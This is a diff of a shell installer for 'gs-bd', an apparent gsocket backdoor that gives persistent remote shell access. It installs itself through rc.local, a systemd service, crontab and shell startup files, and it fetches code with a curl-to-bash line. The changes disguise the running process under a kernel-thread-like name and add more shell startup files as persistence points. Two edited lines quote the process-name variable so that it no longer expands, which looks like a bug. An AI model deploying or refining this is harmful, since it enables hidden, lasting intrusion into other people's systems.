@@ -41,7 +41,11 @@
 # GS_URL_BASE=https://github.com/hackerschoice/binary/raw/main/gsocket/bin/
 #		- Specify URL of static binaries
 # GS_DSTDIR="/tmp/foobar/blah"
-#		- Specify customer installation directory
+#		- Specify custom installation directory
+# GS_HIDDEN_NAME="-bash"
+#       - Specify custom hidden name for process
+# TMPDIR=
+#       - Guess what...
 
 # Global Defines
 URL_BASE="https://github.com/hackerschoice/binary/raw/main/gsocket/bin/"
@@ -52,7 +56,7 @@ DL_CRL="bash -c \"\$(curl -fsSL $URL_DEPLOY)\""
 DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
 # DL_CMD="$DL_CRL"
 BIN_HIDDEN_NAME_DEFAULT=gs-bd
-PROC_HIDDEN_NAME_DEFAULT=-bash
+PROC_HIDDEN_NAME_DEFAULT="[kcached/0]"
 CY="\033[1;33m" # yellow
 CG="\033[1;32m" # green
 CR="\033[1;31m" # red
@@ -258,19 +262,18 @@ init_vars()
 	BIN_HIDDEN_NAME="${BIN_HIDDEN_NAME_DEFAULT}"
 	
 	SEC_NAME="${BIN_HIDDEN_NAME_DEFAULT}.dat"
-	PROC_HIDDEN_NAME="$PROC_HIDDEN_NAME_DEFAULT"
+	PROC_HIDDEN_NAME="${GS_HIDDEN_NAME:-$PROC_HIDDEN_NAME_DEFAULT}"
 	SERVICE_HIDDEN_NAME="${BIN_HIDDEN_NAME}"
 
 	RCLOCAL_DIR="${GS_PREFIX}/etc"
 	RCLOCAL_FILE="${RCLOCAL_DIR}/rc.local"
 
-	RC_FILENAME=".profile"
-	RC_FILENAME_STATUS=".profile"
-	if [[ -f ~/.bashrc ]]; then
-		RC_FILENAME=".bashrc"
-		RC_FILENAME_STATUS=".bashrc." # for status output ~/.bashrc.....[OK]
-	fi
-	RC_FILE="${GS_PREFIX}${HOME}/${RC_FILENAME}"
+	[[ -z $RC_FILENAME ]] && [[ $SHELL =~ zsh ]] && [[ -f ~/.zshrc ]] && RC_FILENAME=".zshrc"
+	[[ -z $RC_FILENAME ]] && [[ $SHELL =~ bash ]] && [[ -f ~/.bash_profile ]] && RC_FILENAME=".bash_profile"
+	[[ -z $RC_FILENAME ]] && [[ $SHELL =~ bash ]] && [[ -f ~/.bash_login ]] && RC_FILENAME=".bash_login"
+	[[ -z $RC_FILENAME ]] && RC_FILENAME=".profile"
+
+	RC_FILE="${GS_PREFIX}${HOME}/${RC_FILENAME}" 
 
 	SERVICE_DIR="${GS_PREFIX}/etc/systemd/system"
 	SERVICE_FILE="${SERVICE_DIR}/${SERVICE_HIDDEN_NAME}.service"
@@ -308,7 +311,7 @@ init_setup()
 	SYSTEMD_SEC_FILE="${SERVICE_DIR}/${SEC_NAME}"
 	RCLOCAL_SEC_FILE="${RCLOCAL_DIR}/${SEC_NAME}"
 	USER_SEC_FILE="$(dirname "${DSTBIN}")/${SEC_NAME}"
-	RCLOCAL_LINE="HOME=$HOME TERM=xterm-256color SHELL=$SHELL GSOCKET_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a ${PROC_HIDDEN_NAME} ${DSTBIN}\""
+	RCLOCAL_LINE="HOME=$HOME TERM=xterm-256color SHELL=$SHELL GSOCKET_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\""
 
 	# There is no reliable way to check if a process is running:
 	# - Process might be running under different name. Especially OSX checks for the orginal name
@@ -317,8 +320,8 @@ init_setup()
 	# The best we can do:
 	# 1. If pidof/killall/pkill exist _AND_ daemon is running then do nothing.
 	# 2. Otherwise start gs-bd as DAEMON. The daemon will exit (fully) if GS-Address is already in use.
-	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || (TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a ${PROC_HIDDEN_NAME} ${DSTBIN})"
-	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || SHELL=$SHELL TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${DSTBIN}\""
+	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || (TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN})"
+	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || SHELL=$SHELL TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\""
 
 	# check that xxd is working as expected (alpine linux does not have -r option)
 	if [[ "$(echo "thcwashere" | xxd -ps -c1024 2>/dev/null| xxd -r -ps 2>/dev/null)" = "thcwashere" ]]; then
@@ -512,7 +515,7 @@ Type=simple
 Restart=always
 RestartSec=10
 WorkingDirectory=/root
-ExecStart=/bin/bash -c \"GSOCKET_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec -a ${PROC_HIDDEN_NAME} ${DSTBIN}\"
+ExecStart=/bin/bash -c \"GSOCKET_ARGS='-k $SYSTEMD_SEC_FILE -ilq' exec -a '${PROC_HIDDEN_NAME}' ${DSTBIN}\"
 
 [Install]
 WantedBy=multi-user.target" >"${SERVICE_FILE}"
@@ -604,7 +607,10 @@ install_user_crontab()
 
 install_user_profile()
 {
-	echo -en 2>&1 "Installing access via ~/${RC_FILENAME_STATUS}......................................"
+	local rc_filename_status
+	rc_filename_status="${RC_FILENAME}................................"
+
+	echo -en 2>&1 "Installing access via ~/${rc_filename_status:0:15}..............................."
 	[[ -f "${RC_FILE}" ]] || { touch "${RC_FILE}"; chmod 600 "${RC_FILE}"; }
 	if grep "$BIN_HIDDEN_NAME" "$RC_FILE" &>/dev/null; then
 		IS_INSTALLED=1
@@ -795,7 +801,7 @@ test_network()
 	# 2. Exit=202 after n seconds. Firewalled/DNS?
 	# 3. Exit=203 if TCP to GSRN is refused.
 	# 3. Exit=61 on GS-Connection refused. (server does not exist)
-	err_log=$(_GSOCKET_SERVER_CHECK_SEC=10 GSOCKET_ARGS="-s ${GS_SECRET}" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
+	err_log=$(_GSOCKET_SERVER_CHECK_SEC=10 GSOCKET_ARGS="-s ${GS_SECRET}" exec -a '$PROC_HIDDEN_NAME' "${DSTBIN}" 2>&1)
 	ret=$?
 
 	[[ -z "$ERR_LOG" ]] && ERR_LOG="$err_log"
@@ -956,7 +962,7 @@ gs_start()
 			# HERE: sec.dat has been updated
 			OK_OUT
 			WARN "More than one ${BIN_HIDDEN_NAME} is running."
-			echo -e 1>&2 "----> You may want to check: ${CM}ps -elf|grep -- ${PROC_HIDDEN_NAME}${CN}"
+			echo -e 1>&2 "----> You may want to check: ${CM}ps -elf|grep -F -- '${PROC_HIDDEN_NAME}'${CN}"
 			echo -e 1>&2 "----> or terminate all     : ${CM}${KL_CMD:-pkill} ${BIN_HIDDEN_NAME}${CN}"
 			echo -e 1>&2 "----> or terminate the old one by logging in and typing:"
 			echo -e 1>&2 "      ${CM}kill -- -\$(ps -o ppid= -p \$(ps -o ppid= -p \$\$))${CN}"
@@ -966,7 +972,7 @@ gs_start()
 	fi
 
 	if [[ -n "$IS_NEED_START" ]]; then
-		(TERM=xterm-256color GSOCKET_ARGS="-s $GS_SECRET -liD" exec -a "$PROC_HIDDEN_NAME" "$DSTBIN")
+		(TERM=xterm-256color GSOCKET_ARGS="-s $GS_SECRET -liD" exec -a '$PROC_HIDDEN_NAME' "$DSTBIN")
 		IS_GS_RUNNING=1
 	fi
 }
